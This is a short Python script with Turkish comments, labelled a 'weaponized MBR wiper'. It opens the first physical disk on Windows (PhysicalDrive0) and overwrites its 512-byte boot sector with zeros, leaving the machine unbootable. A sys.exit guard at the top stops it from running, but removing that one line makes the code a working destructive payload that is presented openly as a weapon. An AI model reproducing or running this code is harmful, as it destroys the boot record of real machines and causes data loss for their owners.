import sys
import os

# --- EMNİYET PİMİ ---
sys.exit("UYARI: BU KOD DİSKİ BOZAR. SAKIN ÇALIŞTIRMAYIN.")

print("--- WEAPONIZED MBR WIPER ---")

def nuke_disk():
    # 1. HEDEF DEĞİŞİMİ (Weaponized Part)
    # Simülasyonda: target = "test_disk.bin"
    # Gerçekte: Windows Fiziksel Disk Yolu
    # \\.\PhysicalDrive0 = Birinci Hard Disk
    target = r"\\.\PhysicalDrive0"
    
    print(f"[*] Hedef: {target}")
    print("[*] Master Boot Record (MBR) siliniyor...")
    
    try:
        # 2. SEKTÖR SİLME
        # 'wb' (Write Binary) modunda fiziksel diski aç
        with open(target, "wb") as disk:
            # İmleci en başa (Sektör 0) al
            disk.seek(0)
            # 512 Byte (Boot Sektörü) boyutunda sıfır yaz
            disk.write(b'\x00' * 512)
            
        print("💀 İŞLEM TAMAM: MBR SİLİNDİ.")
        print("Bilgisayarı yeniden başlatırsanız 'Operating System Not Found' hatası alırsınız.")
        
    except PermissionError:
        print("[-] Yönetici (Admin) yetkisi gerekli.")

if __name__ == "__main__":
    nuke_disk()